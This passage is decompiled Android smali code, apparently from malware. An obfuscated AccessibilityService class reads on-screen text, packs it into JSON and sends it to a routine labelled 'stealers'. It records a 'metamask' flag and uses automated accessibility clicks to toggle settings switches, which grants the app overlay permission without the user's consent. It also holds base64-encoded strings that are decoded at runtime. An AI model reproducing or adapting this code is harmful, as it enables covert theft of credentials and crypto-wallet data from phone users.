    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v2

    invoke-virtual {v3, v4, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    sget-object v2, Lc0/b;->a:Lc0/b;

    sget-object v4, Lb0/b;->a:Lb0/b;

    invoke-virtual {v4}, Lb0/b;->c()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3, v12}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v5, "stealers"

    invoke-virtual {v2, v1, v4, v3, v5}, Lc0/b;->j(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, "metamask"

    const-string v3, "1"

    .line 33
    sget-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v4, :cond_113

    invoke-static {v11}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x0

    invoke-virtual {v1, v4, v5}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v4

    sput-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;

    :cond_113
    sget-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v4}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v4}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v4

    invoke-interface {v4, v2, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v4}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 34
    invoke-virtual/range {p0 .. p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->f()V
    :try_end_49
    .catchall {:try_start_49 .. :try_end_49} :catchall_24

    goto :goto_8f

    :catchall_24
    move-exception v0

    move-object v2, v0

    invoke-static {v2}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :cond_114
    :goto_8f
    return-void
.end method

.method public final a()V
    .locals 1

    :try_start_0
    sget-object v0, Lb0/b;->a:Lb0/b;

    const/4 v0, 0x1

    invoke-virtual {p0, v0}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    const/4 v0, 0x2

    invoke-virtual {p0, v0}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-nez v0, :cond_0

    goto :goto_0

    :cond_0
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->refresh()Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto :goto_0

    :catchall_0
    move-exception v0

    invoke-static {v0}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :goto_0
    return-void
.end method

.method public final b()Z
    .locals 18

    move-object/from16 v1, p0

    const-string v0, "applicationContext"

    const-string v2, ""

    .line 1
    :try_start_0
    sget-object v3, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v3}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v4, "autoClickPerm"

    invoke-interface {v3, v4, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    if-nez v3, :cond_0

    move-object v3, v2

    .line 2
    :cond_0
    const-string v4, "1"

    invoke-static {v3, v4}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_2b

    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-static {v3, v0}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-static {v3}, Lb0/a;->c(Landroid/content/Context;)Z

    move-result v3
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    const-string v4, "null cannot be cast to non-null type android.view.WindowManager"

    const-string v5, "android:system_alert_window"

    const-string v6, "window"

    const-string v7, "appops"

    if-nez v3, :cond_24

    :try_start_1
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-static {v3, v0}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-static {v3}, Lb0/a;->c(Landroid/content/Context;)Z

    move-result v3
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    const/16 v8, 0x80

    const-string v9, "dWpQMzRQMUJNZ0FBYUdibWdSMkdqUT09OjpEekZPejMvNUlKTHpIdzRFZk1mM2FnPT0="

    const-string v10, "eUVDanJhYnF4N0NmN2pBM2NyWnpxZ0FDY2cxSFRWTk5iV1VFeDJGUFJuUT06Olh6Q3ZMR2N3aGVpZXlJVWhVNXZURlE9PQ=="

    if-nez v3, :cond_5

    :try_start_2
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    const-string v11, "android:id/title"

    invoke-virtual {v3, v11}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v3

    if-nez v3, :cond_1

    goto :goto_2

    :cond_1
    invoke-interface {v3}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v3

    :cond_2
    invoke-interface {v3}, Ljava/util/Iterator;->hasNext()Z

    move-result v11

    if-eqz v11, :cond_3

    invoke-interface {v3}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v11

    move-object v12, v11

    check-cast v12, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v12}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v12
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 3
    :try_start_3
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v13

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v14

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v15

    invoke-virtual {v14, v15, v8}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object v14

    invoke-virtual {v13, v14}, Landroid/content/pm/PackageManager;->getApplicationLabel(Landroid/content/pm/ApplicationInfo;)Ljava/lang/CharSequence;

    move-result-object v13

    check-cast v13, Ljava/lang/String;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    goto :goto_0

    :catch_0
    :try_start_4
    invoke-static {v10}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    invoke-static {v9}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    .line 4
    sget-object v13, Lb0/b;->a:Lb0/b;

    move-object v13, v2

    .line 5
    :goto_0
    invoke-static {v12, v13}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_2

    goto :goto_1

    :cond_3
    const/4 v11, 0x0

    :goto_1
    check-cast v11, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v11, :cond_4

    goto :goto_2

    :cond_4
    invoke-virtual {v1, v11}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->j(Landroid/view/accessibility/AccessibilityNodeInfo;)Z

    :cond_5
    :goto_2
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-static {v3, v0}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    .line 6
    invoke-static {v3}, Landroid/provider/Settings;->canDrawOverlays(Landroid/content/Context;)Z

    move-result v8

    if-eqz v8, :cond_6

    goto :goto_3

    :cond_6
    invoke-virtual {v3, v7}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Landroid/app/AppOpsManager;
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    if-eqz v8, :cond_7

    :try_start_5
    invoke-static {}, Landroid/os/Binder;->getCallingUid()I

    move-result v11

    invoke-virtual {v3}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v8, v5, v11, v12}, Landroid/app/AppOpsManager;->checkOp(Ljava/lang/String;ILjava/lang/String;)I

    move-result v3
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_1
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    if-nez v3, :cond_9

    goto :goto_3

    :catch_1
    :cond_7
    :try_start_6
    invoke-virtual {v3, v6}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v8

    if-eqz v8, :cond_8

    check-cast v8, Landroid/view/WindowManager;

    new-instance v11, Landroid/view/View;

    invoke-direct {v11, v3}, Landroid/view/View;-><init>(Landroid/content/Context;)V

    new-instance v3, Landroid/view/WindowManager$LayoutParams;

    const/4 v13, 0x0

    const/4 v14, 0x0

    const/16 v15, 0x7f6

    const/16 v16, 0x18

    const/16 v17, -0x2

    move-object v12, v3

    invoke-direct/range {v12 .. v17}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    invoke-virtual {v11, v3}, Landroid/view/View;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    invoke-interface {v8, v11, v3}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    invoke-interface {v8, v11}, Landroid/view/WindowManager;->removeView(Landroid/view/View;)V

    :goto_3
    const/4 v3, 0x1

    goto :goto_4

    :cond_8
    new-instance v3, Ljava/lang/NullPointerException;

    invoke-direct {v3, v4}, Ljava/lang/NullPointerException;-><init>(Ljava/lang/String;)V

    throw v3
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_2
    .catchall {:try_start_6 .. :try_end_6} :catchall_0

    :catch_2
    :cond_9
    const/4 v3, 0x0

    :goto_4
    if-nez v3, :cond_10

    .line 7
    :try_start_7
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    const-string v8, "android:id/switch_widget"

    invoke-virtual {v3, v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v3

    invoke-interface {v3}, Ljava/util/List;->size()I

    move-result v8

    const/4 v11, 0x1

    if-ne v8, v11, :cond_b

    invoke-static {v3}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v3, :cond_a

    goto/16 :goto_a

    :cond_a
    invoke-virtual {v1, v3}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->j(Landroid/view/accessibility/AccessibilityNodeInfo;)Z

    goto/16 :goto_a

    :cond_b
    invoke-interface {v3}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v3

    :goto_5
    invoke-interface {v3}, Ljava/util/Iterator;->hasNext()Z

    move-result v8

    if-eqz v8, :cond_10

    invoke-interface {v3}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v11

    invoke-virtual {v11}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v11

    const-string v12, "android:id/title"

    invoke-virtual {v11, v12}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v11

    if-nez v11, :cond_c

    move-object/from16 v16, v3

    goto :goto_9

    :cond_c
    invoke-interface {v11}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v11

    :goto_6
    invoke-interface {v11}, Ljava/util/Iterator;->hasNext()Z

    move-result v12

    if-eqz v12, :cond_e

    invoke-interface {v11}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v12

    move-object v13, v12

    check-cast v13, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v13}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v13
    :try_end_7
    .catchall {:try_start_7 .. :try_end_7} :catchall_0

    .line 8
    :try_start_8
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v14

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v15
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_3
    .catchall {:try_start_8 .. :try_end_8} :catchall_0

    move-object/from16 v16, v3

    :try_start_9
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v3
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_4
    .catchall {:try_start_9 .. :try_end_9} :catchall_0

    move-object/from16 v17, v11

    const/16 v11, 0x80

    :try_start_a
    invoke-virtual {v15, v3, v11}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object v3

    invoke-virtual {v14, v3}, Landroid/content/pm/PackageManager;->getApplicationLabel(Landroid/content/pm/ApplicationInfo;)Ljava/lang/CharSequence;

    move-result-object v3

    check-cast v3, Ljava/lang/String;
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_5
    .catchall {:try_start_a .. :try_end_a} :catchall_0

    goto :goto_7

    :catch_3
    move-object/from16 v16, v3

    :catch_4
    move-object/from16 v17, v11

    :catch_5
    :try_start_b
    invoke-static {v10}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    invoke-static {v9}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    .line 9
    sget-object v3, Lb0/b;->a:Lb0/b;

    move-object v3, v2

    .line 10
    :goto_7
    invoke-static {v13, v3}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_d

    goto :goto_8

    :cond_d
    move-object/from16 v3, v16

    move-object/from16 v11, v17

    goto :goto_6

    :cond_e
    move-object/from16 v16, v3

    const/4 v12, 0x0

    :goto_8
    check-cast v12, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v12, :cond_f

    goto :goto_9

    :cond_f
    invoke-virtual {v1, v8}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->j(Landroid/view/accessibility/AccessibilityNodeInfo;)Z

    :goto_9
    move-object/from16 v3, v16

    goto :goto_5

    :cond_10
    :goto_a
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-static {v3, v0}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    .line 11
    invoke-static {v3}, Landroid/provider/Settings;->canDrawOverlays(Landroid/content/Context;)Z

    move-result v8

    if-eqz v8, :cond_11

    goto :goto_b

    :cond_11
    invoke-virtual {v3, v7}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Landroid/app/AppOpsManager;
    :try_end_b
    .catchall {:try_start_b .. :try_end_b} :catchall_0

    if-eqz v8, :cond_12

    :try_start_c
    invoke-static {}, Landroid/os/Binder;->getCallingUid()I

    move-result v11

    invoke-virtual {v3}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v8, v5, v11, v12}, Landroid/app/AppOpsManager;->checkOp(Ljava/lang/String;ILjava/lang/String;)I

    move-result v3
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_6
    .catchall {:try_start_c .. :try_end_c} :catchall_0

    if-nez v3, :cond_14

    goto :goto_b

    :catch_6
    :cond_12
    :try_start_d
    invoke-virtual {v3, v6}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v8

    if-eqz v8, :cond_13

    check-cast v8, Landroid/view/WindowManager;

    new-instance v11, Landroid/view/View;

    invoke-direct {v11, v3}, Landroid/view/View;-><init>(Landroid/content/Context;)V

    new-instance v3, Landroid/view/WindowManager$LayoutParams;

    const/4 v13, 0x0

    const/4 v14, 0x0

    const/16 v15, 0x7f6

    const/16 v16, 0x18

    const/16 v17, -0x2

    move-object v12, v3

    invoke-direct/range {v12 .. v17}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    invoke-virtual {v11, v3}, Landroid/view/View;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    invoke-interface {v8, v11, v3}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    invoke-interface {v8, v11}, Landroid/view/WindowManager;->removeView(Landroid/view/View;)V

    :goto_b
    const/4 v3, 0x1

    goto :goto_c

    :cond_13
    new-instance v3, Ljava/lang/NullPointerException;

    invoke-direct {v3, v4}, Ljava/lang/NullPointerException;-><init>(Ljava/lang/String;)V

    throw v3
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_7
    .catchall {:try_start_d .. :try_end_d} :catchall_0

    :catch_7
    :cond_14
    const/4 v3, 0x0

    :goto_c
    if-nez v3, :cond_1b

    .line 12
    :try_start_e
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    const-string v8, "android:id/widget_frame"

    invoke-virtual {v3, v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v3

    invoke-interface {v3}, Ljava/util/List;->size()I

    move-result v8

    const/4 v11, 0x2

    if-gt v8, v11, :cond_16

    invoke-static {v3}, Lk0/f;->L(Ljava/util/List;)V

    invoke-static {v3}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v3, :cond_15

    goto/16 :goto_12

    :cond_15
    invoke-virtual {v1, v3}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->j(Landroid/view/accessibility/AccessibilityNodeInfo;)Z

    goto/16 :goto_12

    :cond_16
    invoke-interface {v3}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v3

    :goto_d
    invoke-interface {v3}, Ljava/util/Iterator;->hasNext()Z

    move-result v8

    if-eqz v8, :cond_1b

    invoke-interface {v3}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v8

    const-string v11, "android:id/title"

    invoke-virtual {v8, v11}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v8

    if-nez v8, :cond_17

    move-object/from16 v16, v3

    goto :goto_11

    :cond_17
    invoke-interface {v8}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v8

    :goto_e
    invoke-interface {v8}, Ljava/util/Iterator;->hasNext()Z

    move-result v11

    if-eqz v11, :cond_19

    invoke-interface {v8}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v11

    move-object v12, v11

    check-cast v12, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v12}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v12
    :try_end_e
    .catchall {:try_start_e .. :try_end_e} :catchall_0

    .line 13
    :try_start_f
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v13

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v14

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v15
    :try_end_f
    .catch Ljava/lang/Exception; {:try_start_f .. :try_end_f} :catch_8
    .catchall {:try_start_f .. :try_end_f} :catchall_0

    move-object/from16 v16, v3

    const/16 v3, 0x80

    :try_start_10
    invoke-virtual {v14, v15, v3}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object v3

    invoke-virtual {v13, v3}, Landroid/content/pm/PackageManager;->getApplicationLabel(Landroid/content/pm/ApplicationInfo;)Ljava/lang/CharSequence;

    move-result-object v3

    check-cast v3, Ljava/lang/String;
    :try_end_10
    .catch Ljava/lang/Exception; {:try_start_10 .. :try_end_10} :catch_9
    .catchall {:try_start_10 .. :try_end_10} :catchall_0

    goto :goto_f

    :catch_8
    move-object/from16 v16, v3

    :catch_9
    :try_start_11
    invoke-static {v10}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    invoke-static {v9}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    .line 14
    sget-object v3, Lb0/b;->a:Lb0/b;

    move-object v3, v2

    .line 15
    :goto_f
    invoke-static {v12, v3}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_18

    goto :goto_10

    :cond_18
    move-object/from16 v3, v16

    goto :goto_e

    :cond_19
    move-object/from16 v16, v3

    const/4 v11, 0x0

    :goto_10
    check-cast v11, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v11, :cond_1a

    goto :goto_11

    :cond_1a
    invoke-virtual {v1, v11}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->j(Landroid/view/accessibility/AccessibilityNodeInfo;)Z

    :goto_11
    move-object/from16 v3, v16

    goto :goto_d

    :cond_1b
    :goto_12
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-static {v3, v0}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    .line 16
    invoke-static {v3}, Landroid/provider/Settings;->canDrawOverlays(Landroid/content/Context;)Z

    move-result v8

    if-eqz v8, :cond_1c

    goto :goto_13

    :cond_1c
    invoke-virtual {v3, v7}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Landroid/app/AppOpsManager;
    :try_end_11
    .catchall {:try_start_11 .. :try_end_11} :catchall_0

    if-eqz v8, :cond_1d

    :try_start_12
    invoke-static {}, Landroid/os/Binder;->getCallingUid()I

    move-result v11

    invoke-virtual {v3}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v8, v5, v11, v12}, Landroid/app/AppOpsManager;->checkOp(Ljava/lang/String;ILjava/lang/String;)I

    move-result v3
    :try_end_12
    .catch Ljava/lang/Exception; {:try_start_12 .. :try_end_12} :catch_a
    .catchall {:try_start_12 .. :try_end_12} :catchall_0

    if-nez v3, :cond_1f

    goto :goto_13

    :catch_a
    :cond_1d
    :try_start_13
    invoke-virtual {v3, v6}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v8

    if-eqz v8, :cond_1e

    check-cast v8, Landroid/view/WindowManager;

    new-instance v11, Landroid/view/View;

    invoke-direct {v11, v3}, Landroid/view/View;-><init>(Landroid/content/Context;)V

    new-instance v3, Landroid/view/WindowManager$LayoutParams;

    const/4 v13, 0x0

    const/4 v14, 0x0

    const/16 v15, 0x7f6

    const/16 v16, 0x18

    const/16 v17, -0x2

    move-object v12, v3

    invoke-direct/range {v12 .. v17}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    invoke-virtual {v11, v3}, Landroid/view/View;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    invoke-interface {v8, v11, v3}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    invoke-interface {v8, v11}, Landroid/view/WindowManager;->removeView(Landroid/view/View;)V

    :goto_13
    const/4 v3, 0x1

    goto :goto_14

    :cond_1e
    new-instance v3, Ljava/lang/NullPointerException;

    invoke-direct {v3, v4}, Ljava/lang/NullPointerException;-><init>(Ljava/lang/String;)V

    throw v3
    :try_end_13
    .catch Ljava/lang/Exception; {:try_start_13 .. :try_end_13} :catch_b
    .catchall {:try_start_13 .. :try_end_13} :catchall_0

    :catch_b
    :cond_1f
    const/4 v3, 0x0

    :goto_14
    if-nez v3, :cond_24

    .line 17
    :try_start_14
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    const-string v8, "android:id/title"

    invoke-virtual {v3, v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v3

    if-nez v3, :cond_20

    goto :goto_17

    :cond_20
    invoke-interface {v3}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v3

    :cond_21
    invoke-interface {v3}, Ljava/util/Iterator;->hasNext()Z

    move-result v8

    if-eqz v8, :cond_22

    invoke-interface {v3}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v8

    move-object v11, v8

    check-cast v11, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v11}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v11
    :try_end_14
    .catchall {:try_start_14 .. :try_end_14} :catchall_0

    .line 18
    :try_start_15
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v12

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v13

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v14

    const/16 v15, 0x80

    invoke-virtual {v13, v14, v15}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object v13

    invoke-virtual {v12, v13}, Landroid/content/pm/PackageManager;->getApplicationLabel(Landroid/content/pm/ApplicationInfo;)Ljava/lang/CharSequence;

    move-result-object v12

    check-cast v12, Ljava/lang/String;
    :try_end_15
    .catch Ljava/lang/Exception; {:try_start_15 .. :try_end_15} :catch_c
    .catchall {:try_start_15 .. :try_end_15} :catchall_0

    goto :goto_15

    :catch_c
    :try_start_16
    invoke-static {v10}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    invoke-static {v9}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    .line 19
    sget-object v12, Lb0/b;->a:Lb0/b;

    move-object v12, v2

    .line 20
    :goto_15
    invoke-static {v11, v12}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v11

    if-eqz v11, :cond_21

    goto :goto_16

    :cond_22
    const/4 v8, 0x0

    :goto_16
    check-cast v8, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v8, :cond_23

    goto :goto_17

    :cond_23
    invoke-virtual {v1, v8}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->j(Landroid/view/accessibility/AccessibilityNodeInfo;)Z

    :cond_24
    :goto_17
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-static {v3, v0}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    .line 21
    invoke-static {v3}, Landroid/provider/Settings;->canDrawOverlays(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_25

    goto :goto_18

    :cond_25
    invoke-virtual {v3, v7}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AppOpsManager;
    :try_end_16
    .catchall {:try_start_16 .. :try_end_16} :catchall_0

    if-eqz v0, :cond_26

    :try_start_17
    invoke-static {}, Landroid/os/Binder;->getCallingUid()I

    move-result v7

    invoke-virtual {v3}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v8

